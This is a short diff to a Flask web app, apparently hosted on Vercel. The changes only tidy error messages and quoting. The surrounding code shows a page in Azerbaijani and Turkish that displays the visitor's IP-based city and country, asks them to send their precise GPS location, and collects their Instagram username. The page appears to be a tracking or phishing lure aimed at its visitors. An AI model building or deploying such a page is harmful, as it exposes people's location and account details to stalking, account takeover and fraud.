@@ -44,7 +44,6 @@ def index():
             <p>IP: {real_ip} | {ip_location['city']}, {ip_location['country']}</p>
             
             <button onclick="getPreciseLocation()">📍 Dəqiq Yerimi Göndər (GPS)</button>
-            
             <div id="location"></div>
 
             <input type="text" id="username" placeholder="Instagram kullanıcı adınız" style="width:100%;padding:15px;margin:15px 0;border:2px solid #ddd;border-radius:8px;">
@@ -85,9 +84,9 @@ def index():
             function showError(error) {{
                 const locDiv = document.getElementById('location');
                 if (error.code === 1) {
-                    locDiv.innerHTML = "⚠️ İstifadəçi icazə vermədi.<br>IP məlumatı ilə davam edilir.";
+                    locDiv.innerHTML = "⚠️ İstifadəçi icazə vermədi.<br>IP ilə davam edilir.";
                 } else {
-                    locDiv.innerHTML = "❌ GPS xətası baş verdi.";
+                    locDiv.innerHTML = "❌ GPS xətası.";
                 }
             }}
 
@@ -111,6 +110,6 @@ def index():
     '''
     return html
 
-# Vercel üçün vacib
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+# Vercel üçün vacib hissə
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
